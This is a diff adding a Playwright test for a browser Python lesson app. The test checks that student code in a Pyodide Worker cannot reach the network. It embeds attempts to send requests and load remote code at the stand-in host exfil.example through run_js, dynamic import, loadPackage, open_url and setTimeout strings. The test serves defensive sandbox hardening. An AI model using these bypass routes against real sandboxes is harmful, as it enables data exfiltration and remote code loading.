@@ -140,3 +140,40 @@ test("el código Python del alumno no puede enviar datos a otros servidores", as
   await page.waitForTimeout(500);
   expect(hits).toEqual([]);
 });
+
+test("el Worker tampoco sale a la red por las vías propias de Pyodide ni por setTimeout con texto", async ({ page, context }) => {
+  // Complementa la prueba anterior: run_js, loadPackage, open_url y setTimeout("…") no pasan por js.fetch
+  const hits = [];
+  await context.route("https://exfil.example/**", (route) => {
+    hits.push(route.request().url());
+    return route.fulfill({ status: 200, body: "ok", headers: { "access-control-allow-origin": "*" } });
+  });
+  await openLesson(page, "variables");
+  const code = [
+    "import js",
+    "import pyodide_js",
+    "from pyodide.code import run_js",
+    "from pyodide.http import open_url",
+    "intentos = {",
+    "    'run_js_fetch': lambda: run_js(\"fetch('https://exfil.example/runjs-fetch')\"),",
+    "    'run_js_import': lambda: run_js(\"import('https://exfil.example/runjs-import.js')\"),",
+    "    'loadPackage': lambda: pyodide_js.loadPackage('https://exfil.example/paquete.whl'),",
+    "    'open_url': lambda: open_url('https://exfil.example/open-url'),",
+    "    'setTimeout_fetch': lambda: js.setTimeout(\"fetch('https://exfil.example/timeout-fetch')\", 0),",
+    "    'setTimeout_import': lambda: js.setTimeout(\"import('https://exfil.example/timeout-import.js')\", 0),",
+    "}",
+    "for nombre, intento in intentos.items():",
+    "    try:",
+    "        intento()",
+    "        print(nombre, 'ejecutado')",
+    "    except Exception:",
+    "        print(nombre, 'bloqueado')",
+    "print('Python sigue funcionando', 2 + 2)",
+  ].join("\n");
+  await page.locator("#console-editor").fill(code);
+  await page.locator("#console-run").click();
+  const output = page.locator("#console-output");
+  await expect(output).toContainText("Python sigue funcionando 4", { timeout: 90_000 });
+  await page.waitForTimeout(3000); // las vías asíncronas (promesas y temporizadores) tardan en intentar la petición
+  expect(hits, `Peticiones que han salido del Worker: ${hits.join(", ")}`).toEqual([]);
+});
